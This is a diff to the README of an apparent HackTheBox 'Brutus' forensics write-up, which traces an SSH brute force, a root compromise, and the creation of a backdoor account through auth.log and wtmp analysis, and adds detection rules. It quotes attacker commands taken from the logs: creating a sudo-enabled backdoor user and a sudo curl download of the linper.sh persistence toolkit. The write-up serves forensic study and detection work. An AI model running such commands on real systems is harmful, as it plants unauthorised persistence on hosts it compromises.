@@ -6,6 +6,12 @@ Full forensic investigation of a compromised Confluence server using only Unix a
 
 ---
 
+## 🧪 Lab Context
+
+This investigation was conducted in a simulated environment using the HackTheBox Brutus Sherlock lab. The scenario replicates a real-world SSH brute force attack and post-compromise activity on a Confluence server, designed for forensic analysis and detection engineering practice.
+
+---
+
 ## 🔥 Highlights
 
 - Identified attacker IP from 165+ failed SSH login attempts using log frequency analysis
@@ -13,19 +19,67 @@ Full forensic investigation of a compromised Confluence server using only Unix a
 - Traced full post-compromise chain: root access → backdoor account → sudo escalation → persistence toolkit download
 - Correlated two separate log artifacts (`auth.log` + binary `wtmp`) to build a complete attack timeline
 - Mapped all attacker actions to MITRE ATT&CK with full tactic and technique IDs
+- Produced 6 detection rules (Elastic KQL, Splunk SPL, Sigma) covering every attack stage
 
 ---
 
-## 🛠️ Skills Used
+## 🛠️ Tools Used
 
-`Unix Log Forensics` `auth.log Analysis` `wtmp Parsing` `SSH Brute Force Detection` `Session Attribution` `Privilege Escalation Detection` `MITRE ATT&CK` `Incident Response` `grep` `sort` `uniq`
+| Tool | Purpose |
+|---|---|
+| `grep` | Filter auth.log for specific event types — sshd, Accepted password, useradd |
+| `sort` + `uniq -c` | IP frequency analysis to identify brute force source |
+| `less` | Log navigation and pattern inspection |
+| `utmp.py` | Parse binary wtmp artifact into human-readable session data |
+| `last -f wtmp` | Alternative wtmp parsing for session timestamps |
+
+**Raw command proof:**
+```bash
+# Identify attacker IP by failure frequency
+grep sshd auth.log | grep -v pam_unix | grep -oP '\d{1,3}(\.\d{1,3}){3}' | sort | uniq -c | sort -rn
+
+# Output:
+170  65.2.161.68
+  1  203.101.190.9
+  1  172.31.35.28
+
+# Confirm successful auth
+grep sshd auth.log | grep "Accepted password" | grep 65.2.161.68
+
+# Parse wtmp binary
+python3 utmp.py wtmp
+
+# Find session IDs
+grep "session opened" auth.log | grep 65.2.161.68
+
+# Find backdoor account creation
+grep "useradd\|usermod" auth.log
+
+# Find persistence download
+grep "sudo.*COMMAND" auth.log | grep cyberjunkie
+```
+
+---
+
+## 🧠 Detection Engineering Perspective
+
+This investigation was translated into detection logic to identify similar attack patterns in SIEM environments. Rules were designed to detect:
+
+- High-volume SSH failures from a single source IP
+- Successful login following brute force attempts (EQL sequence)
+- Root account usage directly over SSH
+- Unauthorised local account creation on production servers
+- Privilege escalation via sudo group modification
+- Suspicious outbound tool downloads executed with elevated privileges
+
+Full rules in Elastic KQL, Splunk SPL, and Sigma YAML format → [`docs/detection-rules.md`](./docs/detection-rules.md)
 
 ---
 
 ## 📸 Screenshots
 
 ### IP Frequency Analysis — Attacker Identified
-> grep + sort + uniq revealing 65.2.161.68 with 165+ failed attempts — characteristic automated brute force volume.
+> `grep + sort + uniq` revealing `65.2.161.68` with 165+ failed attempts — characteristic automated brute force volume.
 
 ![IP Frequency](screenshots/ip-frequency.png)
 
@@ -35,12 +89,12 @@ Full forensic investigation of a compromised Confluence server using only Unix a
 ![Failed Logins](screenshots/failed-logins.png)
 
 ### Root Account Compromised — Accepted Password
-> auth.log `Accepted password` event confirming root credentials obtained from 65.2.161.68.
+> auth.log `Accepted password` event confirming root credentials obtained from `65.2.161.68`.
 
 ![Root Compromise](screenshots/root-compromise.png)
 
 ### Manual Session Timestamp — wtmp
-> wtmp artifact parsed via utmp.py — interactive session established at 2024-03-06 06:32:45 UTC.
+> wtmp artifact parsed via `utmp.py` — interactive session established at 2024-03-06 06:32:45 UTC.
 
 ![wtmp Session](screenshots/wtmp-session.png)
 
@@ -50,7 +104,7 @@ Full forensic investigation of a compromised Confluence server using only Unix a
 ![Sessions](screenshots/sessions.png)
 
 ### Backdoor Account Creation — cyberjunkie
-> auth.log `useradd` and `usermod` entries confirming cyberjunkie created and added to sudo group.
+> auth.log `useradd` and `usermod` entries confirming `cyberjunkie` created and added to sudo group.
 
 ![Backdoor Account](screenshots/backdoor-account.png)
 
@@ -65,7 +119,7 @@ Full forensic investigation of a compromised Confluence server using only Unix a
 ![Session End](screenshots/session-end.png)
 
 ### Persistence Script Download — linper.sh
-> sudo COMMAND log entry showing cyberjunkie downloading linper.sh via curl from GitHub.
+> sudo COMMAND log entry showing `cyberjunkie` downloading `linper.sh` via curl from GitHub.
 
 ![Linper Download](screenshots/linper-download.png)
 
@@ -75,8 +129,6 @@ Full forensic investigation of a compromised Confluence server using only Unix a
 
 **Artifacts:** `auth.log` + `wtmp` (binary — parsed with `utmp.py`)
 
-**Tools:** `grep`, `sort`, `uniq`, `less`, `utmp.py`
-
 **Approach:** Systematic log traversal — establish brute force scope → isolate successful auth events → trace post-auth activity via session IDs and sudo logs → correlate with wtmp for timeline precision.
 
 ---
@@ -84,11 +136,8 @@ Full forensic investigation of a compromised Confluence server using only Unix a
 ## 📋 Investigation Tasks & Findings
 
 ### Task 1 — Attacker IP Address
-**Command used:**
-```bash
-grep sshd auth.log | grep -v pam_unix | grep -oP '\d{1,3}(\.\d{1,3}){3}' | sort | uniq -c | sort -rn
-```
-Three IPs returned. `65.2.161.68` appeared **165 times** — overwhelmingly failed SSH attempts. Characteristic of automated brute force tooling (Hydra / Medusa).
+
+Three IPs returned from frequency analysis. `65.2.161.68` appeared **165 times** — overwhelmingly failed SSH attempts. Characteristic of automated brute force tooling (Hydra / Medusa).
 
 | Finding | Value |
 |---|---|
@@ -97,11 +146,8 @@ Three IPs returned. `65.2.161.68` appeared **165 times** — overwhelmingly fail
 ---
 
 ### Task 2 — Compromised Account
-**Command used:**
-```bash
-grep sshd auth.log | grep "Accepted password" | grep 65.2.161.68
-```
-Successful authentication confirmed for the **root** account. Session opened and closed within the same second — automated tool confirming discovered credentials, not a human operator.
+
+Successful authentication confirmed for the **root** account. Session opened and closed within the same second — automated tool confirming credentials, not a human operator.
 
 | Finding | Value |
 |---|---|
@@ -110,13 +156,8 @@ Successful authentication confirmed for the **root** account. Session opened and
 ---
 
 ### Task 3 — Manual Login Timestamp (wtmp)
-The first root login (Session 34) was automated. The `wtmp` binary artifact was parsed to identify when the **manual interactive session** was established.
 
-```bash
-python3 utmp.py wtmp
-```
-
-The 1-second difference between auth.log (`06:32:44`) and wtmp (`06:32:45`) reflects the system's processing sequence: password accepted → terminal session established.
+The first root login (Session 34) was automated. The `wtmp` binary artifact was parsed to identify when the **manual interactive session** was established. The 1-second difference between auth.log (`06:32:44`) and wtmp (`06:32:45`) reflects the system's processing sequence: password accepted → terminal session established.
 
 | Finding | Value |
 |---|---|
@@ -125,6 +166,7 @@ The 1-second difference between auth.log (`06:32:44`) and wtmp (`06:32:45`) refl
 ---
 
 ### Task 4 — Attacker's SSH Session Number
+
 Two root sessions visible from the attacker IP: **Session 34** and **Session 37**.
 
 - **Session 34** — opened and closed within the same second → automated brute force confirmation
@@ -137,13 +179,6 @@ Two root sessions visible from the attacker IP: **Session 34** and **Session 37*
 ---
 
 ### Task 5 — Backdoor Account
-Within Session 37, the attacker executed user management commands:
-
-```bash
-# Observed in auth.log
-useradd cyberjunkie
-usermod -aG sudo cyberjunkie
-```
 
 New account `cyberjunkie` created and immediately added to the `sudo` group — granting full administrative privileges for persistent access independent of the root password.
 
@@ -154,7 +189,6 @@ New account `cyberjunkie` created and immediately added to the `sudo` group — 
 ---
 
 ### Task 6 — MITRE ATT&CK Persistence Technique
-Creating a local account for persistence maps to:
 
 | Finding | Value |
 |---|---|
@@ -163,7 +197,6 @@ Creating a local account for persistence maps to:
 ---
 
 ### Task 7 — Session 37 End Time
-Filtered auth.log for `session closed` event for Session 37.
 
 | Finding | Value |
 |---|---|
@@ -173,13 +206,14 @@ Filtered auth.log for `session closed` event for Session 37.
 ---
 
 ### Task 8 — Persistence Script Download
+
 After the root session ended, the attacker logged back in as `cyberjunkie` and executed:
 
 ```bash
 sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 ```
 
-`linper.sh` is the **Linux Persistence Toolkit** by montysecurity — an open-source tool that installs multiple persistence mechanisms on a compromised Linux system. Its use indicates the attacker intended multi-layered, long-term persistence beyond the backdoor account alone.
+`linper.sh` is the **Linux Persistence Toolkit** — installs multiple persistence mechanisms (cron jobs, SSH key injection, SUID binaries). Using `curl` (a pre-installed system binary) is a living-off-the-land technique that avoids process-based detections.
 
 | Finding | Value |
 |---|---|
@@ -232,6 +266,22 @@ sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/l
 
 ---
 
+## 🚨 Detection Rules
+
+Rules derived directly from this investigation — covering every stage of the attack chain.
+Full rules with Elastic KQL, Splunk SPL, and Sigma format: [`docs/detection-rules.md`](./docs/detection-rules.md)
+
+| Rule | Technique | Severity |
+|---|---|---|
+| SSH High Volume Failures from Single IP | T1110.001 | Medium |
+| SSH Failures Followed by Successful Login (EQL) | T1110.001 | High |
+| Root Account SSH Login | T1078 | High |
+| New Local User Account Created | T1136.001 | Medium |
+| Account Added to sudo / wheel Group | T1548.003 | High |
+| sudo curl / wget to External URL | T1105 | High |
+
+---
+
 ## 🧠 Key Takeaways
 
 - **auth.log is more than a brute force detector** — it records privilege escalation, account management, sudo usage, and command execution in detail
@@ -259,13 +309,16 @@ sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/l
 htb-brutus-ssh-forensics/
 │
 ├── README.md                        ← This file
-├── investigation-notes.md           ← Detailed task-by-task analysis notes
-├── mitre-mapping.md                 ← Full MITRE ATT&CK technique breakdown
-├── ioc-list.md                      ← Extracted IOCs for detection/blocking
 ├── LICENSE
 ├── .gitignore
 │
-└── Screenshots/                     ← Evidence screenshots from auth.log + wtmp analysis
+├── docs/                            ← Supporting analysis documents
+│   ├── investigation-notes.md       ← Detailed task-by-task analysis notes
+│   ├── mitre-mapping.md             ← Full MITRE ATT&CK technique breakdown
+│   ├── detection-rules.md           ← Elastic KQL, Splunk SPL, Sigma rules
+│   └── ioc-list.md                  ← Extracted IOCs for detection/blocking
+│
+└── screenshots/                     ← Evidence screenshots from auth.log + wtmp analysis
     ├── ip-frequency.png
     ├── failed-logins.png
     ├── root-compromise.png
